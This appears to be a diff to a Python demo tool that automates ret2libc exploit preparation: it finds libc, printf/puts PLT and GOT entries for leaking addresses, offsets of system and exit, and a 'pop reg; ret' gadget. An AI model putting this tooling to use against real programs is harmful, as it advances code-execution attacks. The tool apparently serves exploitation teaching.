@@ -51,6 +51,65 @@ else:
     print("No segfault found")
 
 
+# check for libc
+b_handler = Bin_handler(program_name)
+if b_handler.has_libc() == True:
+    print("Found libc at", b_handler.libc_path)
+
+else:
+    print("Libc not found")
+    exit()
+
+# check for plt sections, we want printf or puts that will be used for leaking the libc address
+# for GOT address, we are interested .got.plt section of "readelf -S binary_file"
+found_printf, printf_plt, printf_got = b_handler.search_plt_and_got_function(program_name, 'printf')
+found_printf = False
+found_puts, puts_plt, puts_got = b_handler.search_plt_and_got_function(program_name, 'puts')
+
+if found_printf:
+    print("Found printf@plt", printf_plt)
+    print("Found printf@got", printf_got)
+
+if found_puts:
+    print("Found puts@plt", puts_plt)
+    print("Found puts@got", puts_got)
+
+# check for address of important functions
+system_found, system_address_offset = b_handler.search_function(b_handler.libc_path, 'system')
+printf_found, printf_address_offset = b_handler.search_function(b_handler.libc_path, 'printf')
+puts_found, puts_address_offset = b_handler.search_function(b_handler.libc_path, 'puts')
+exit_found, exit_address_offset = b_handler.search_function(b_handler.libc_path, 'exit')
+sstart_found, sstart_address = b_handler.search_asm_function(program_name, '_start')
+
+print("Offset of system", system_address_offset)
+print("Offset of printf", printf_address_offset)
+print("Offset of puts", puts_address_offset)
+print("offset of exit", exit_address_offset)
+print("Address of _start", sstart_address)
+
+
+click.confirm('[Demo pause] Press any key to continue searching for gadget', default="y")
+print("")
+
+# find any gadget pop register; ret;
+executable_sections = b_handler.get_executable_sections(program_name)
+gfinder = Gadget_finder(program_name)
+found_gadget = False
+gadget_address = ''
+popregret_address = ''
+for esection in executable_sections:
+    print("Checking executable section", esection)
+    esec_add_int = int(executable_sections[esection][0], 16)
+    esec_start_int = int(executable_sections[esection][1], 16)
+    esec_end_int = esec_start_int + int(executable_sections[esection][2], 16)
+    found_gadget, gadget_address = gfinder.find("0x([a-f0-9]+):\spop\se\w?x;\s?(0x[a-f0-9]+):\s?ret\s?;", esec_start_int, esec_end_int)
+    if found_gadget:
+        print("Found gadget in section", esection, "at offset", gadget_address)
+        popregret_address = esec_add_int + int(gadget_address, 16)
+        break
+
+click.confirm('[Demo pause] Press any key to continue', default="y")
+print("")
 
 
 # finally, do cleanup of file ??
